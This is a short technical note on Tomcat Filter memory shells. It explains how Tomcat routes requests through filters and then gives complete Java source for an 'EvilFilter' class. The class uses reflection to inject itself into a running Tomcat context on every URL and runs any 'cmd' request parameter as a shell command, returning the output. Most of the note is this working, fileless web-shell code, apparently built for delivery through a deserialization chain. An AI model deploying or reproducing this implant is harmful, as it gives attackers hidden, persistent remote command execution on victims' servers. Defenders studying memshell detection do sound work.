# Filter memshell

## Analysis

The process of the `Tomcat` calling a specific `Filter` according to the request URL:

* Traverse the `filterMaps`, a mapping between the request URL and the `FilterMap` object, and get the corresponding `FilterMap` object. The `FilterMap` class is a mapping between the request URL and the `filterName`.

* Lookup the corresponding `filterConfig`, a `ApplicationFilterConfig` object, in the `filterConfigs` by the `filterName`. Then add it to the `FilterChain`.

* Traverse the `filterConfig` in the `FilterChain`, then call the `getFilter()` method to obtain the corresponding `Filter` and execute the `doFilter()` method.

* The `Filter` is encapsulated as the `FilterDef` object, and the `FilterDef` object is added to `FilterDefs`, when the `Filter` is added dynamically.

To add a `Filter` dynamically, we should:

* Create a `FilterDef` object to encapsulate the `Filter`, then call the `addFilterDef()` method of the `StandardContext` class to add it to `FilterDefs`.

* Create a new `FilterMap` object, and call the `addFilterMapBefore()` method of the `StandardContext` class to add it to `filterMaps`.

* Create a new `ApplicationFilterConfig` object, and call the `put()` of the `filterConfigs`.

Moreover, we must achieve the `doFilter()` method and write malicious code in this method.

## Code

    public class EvilFilter extends AbstractTranslet implements Filter {
        static {
            final String name = "Ya0h4cker";
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            try {
                Field field = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
                field.setAccessible(true);
                WebResourceRoot resources = (WebResourceRoot) field.get(webappClassLoaderBase);
                StandardContext standardContext = (StandardContext) resources.getContext();

                Field configs = standardContext.getClass().getDeclaredField("filterConfigs");
                configs.setAccessible(true);
                Map filterConfigs = (Map) configs.get(standardContext);

                if (filterConfigs.get(name) == null) {
                    EvilFilter filter = new EvilFilter();

                    FilterDef filterDef = new FilterDef();
                    filterDef.setFilter(filter);
                    filterDef.setFilterName(name);
                    filterDef.setFilterClass(filter.getClass().getName());
                    standardContext.addFilterDef(filterDef);

                    FilterMap filterMap = new FilterMap();
                    filterMap.addURLPattern("/*");
                    filterMap.setFilterName(name);
                    filterMap.setDispatcher(DispatcherType.REQUEST.name());
                    standardContext.addFilterMapBefore(filterMap);

                    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
                    constructor.setAccessible(true);
                    ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
                    filterConfigs.put(name, applicationFilterConfig);

                    System.out.println("Inject success");
                }
            } catch (NoSuchFieldException | IllegalAccessException | InvocationTargetException | NoSuchMethodException | InstantiationException e) {
                e.printStackTrace();
            }
        }

        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }

        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }

        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            System.out.println("Evil dofilter");
            if (servletRequest.getParameter("cmd") != null) {
                String cmd = servletRequest.getParameter("cmd");
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                PrintWriter out = servletResponse.getWriter();
                out.println(output);
                out.flush();
                out.close();
                return;
            }
            filterChain.doFilter(servletRequest, servletResponse);
        }

        @Override
        public void destroy() {
        }
    }
